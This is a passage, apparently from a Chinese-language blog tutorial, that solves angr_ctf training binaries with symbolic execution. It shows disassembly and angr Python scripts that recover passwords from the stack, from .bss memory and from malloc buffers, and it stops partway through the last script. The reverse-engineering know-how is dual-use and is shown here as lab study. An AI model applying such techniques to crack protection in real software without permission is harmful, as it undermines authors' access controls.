&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048682&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_10&lt;/span&gt;]     &lt;span style=&#34;color:#75715e&#34;&gt;; 2nd input stores here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.text&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;08048685&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048686&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_C&lt;/span&gt;]      &lt;span style=&#34;color:#75715e&#34;&gt;; 1st input stores here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.text&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;08048689&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;0804868&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;A&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;aUU&lt;/span&gt;      &lt;span style=&#34;color:#75715e&#34;&gt;; &amp;#34;%u %u&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.text&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0804868&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;F&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;___isoc99_scanf&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048694&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048697&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;eax&lt;/span&gt;, [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_C&lt;/span&gt;]      &lt;span style=&#34;color:#75715e&#34;&gt;; state starts here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.text&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0804869&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;A&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;sub&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Ch&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./04_angr_symbolic_stack&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})
after_input_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048697&lt;/span&gt;
state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;entry_state(addr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;after_input_addr)

user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)]

&lt;span style=&#34;color:#75715e&#34;&gt;# state.regs.ebp = state.regs.esp&lt;/span&gt;
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;esp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;regs&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ebp &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stack_push(user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stack_push(user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)

find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80486E4&lt;/span&gt;
avoid_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x80486D2&lt;/span&gt;

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;find_addr, avoid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;avoid_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; user_input:
        print (simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(a), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;)
    print ()
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用的方法是 &lt;code&gt;stack_push&lt;/code&gt;，所以需要先把 &lt;code&gt;esp&lt;/code&gt; 设置好&lt;/p&gt;
&lt;p&gt;剩下的应该没什么变化&lt;/p&gt;
&lt;h2 id=&#34;symbolic-memory&#34;&gt;symbolic memory&lt;/h2&gt;
&lt;p&gt;这题是输入存到了 &lt;code&gt;.bss&lt;/code&gt; 段中&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-asm&#34; data-lang=&#34;asm&#34;&gt;.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;080485&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;E0&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;unk_A1BA1D8&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;080485&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;E5&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;unk_A1BA1D0&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;080485&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;EA&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;unk_A1BA1C8&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;080485&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;EF&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;user_input&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;080485&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;F4&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;a8s8s8s8s&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;; &amp;#34;%8s %8s %8s %8s&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.text&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;080485&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;F9&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;___isoc99_scanf&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;080485&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;FE&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;add&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;esp&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;h&lt;/span&gt;
.text:&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;08048601&lt;/span&gt;                 &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [&lt;span style=&#34;color:#66d9ef&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var_C&lt;/span&gt;], &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;       &lt;span style=&#34;color:#75715e&#34;&gt;; state starts here
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;.text&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;08048608&lt;/span&gt;                 &lt;span style=&#34;color:#66d9ef&#34;&gt;jmp&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;short&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;loc_8048637&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./05_angr_symbolic_memory&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;base_addr&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})

start_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048601&lt;/span&gt;
state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start_addr)

user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;)]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; u &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; user_input:
    state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(u &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x20&lt;/span&gt;)
    state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;solver&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(u &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7f&lt;/span&gt;)

mem_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA1BA1C0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;):
    state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(mem_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i, user_input[i])

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)

find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048672&lt;/span&gt;
avoid_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x804865B&lt;/span&gt;

simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;explore(find&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;find_addr, avoid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;avoid_addr)

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
            print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;, end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
        print (chr(simgr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;found[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;se&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;eval(user_input[i])), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
    print ()
&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;no result&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;用的是 &lt;code&gt;memory.store(store_addr, store_symbolic)&lt;/code&gt; 方法&lt;/p&gt;
&lt;h2 id=&#34;symbolic-dynamic-memory&#34;&gt;symbolic dynamic memory&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  buffer0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;);
  buffer1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;);
  memset(buffer0, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;);
  memset(buffer1, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter the password: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%8s %8s&amp;#34;&lt;/span&gt;, buffer0, buffer1, v6);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这题的输入存储到了 &lt;code&gt;malloc&lt;/code&gt; 中，这个地址动态的，如果仅仅使用 &lt;code&gt;memory.store()&lt;/code&gt; 无法确定存储的地址&lt;/p&gt;
&lt;p&gt;因此先将 &lt;code&gt;buffer&lt;/code&gt; 的地址修改为一个自定义的虚假地址（因为 &lt;code&gt;buffer&lt;/code&gt; 在 &lt;code&gt;.bss&lt;/code&gt; 段上，地址是固定的），然后往这个地址中写入数据，后续程序的模拟执行会使用这个虚假地址&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; angr &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; claripy

proj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Project(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./06_angr_symbolic_dynamic_memory&amp;#39;&lt;/span&gt;, main_opts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;base_addr&amp;#39;&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048000&lt;/span&gt;})

state_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048699&lt;/span&gt;
state &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;blank_state(addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; state_addr)

buffer0_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xABCC8A4&lt;/span&gt;
buffer1_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xABCC8AC&lt;/span&gt;

fake_heap_addr0 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDEADBE00&lt;/span&gt;
fake_heap_addr1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDEADBF00&lt;/span&gt;

state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(buffer0_addr, fake_heap_addr0, endness&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(buffer1_addr, fake_heap_addr1, endness&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;arch&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory_endness)

user_input &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [claripy&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;BVS(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)]
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(fake_heap_addr0, user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
state&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;store(fake_heap_addr1, user_input[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])

simgr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; proj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;factory&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;simgr(state)

find_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048759&lt;/span&gt;
avoid_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048747&lt;/span&gt;

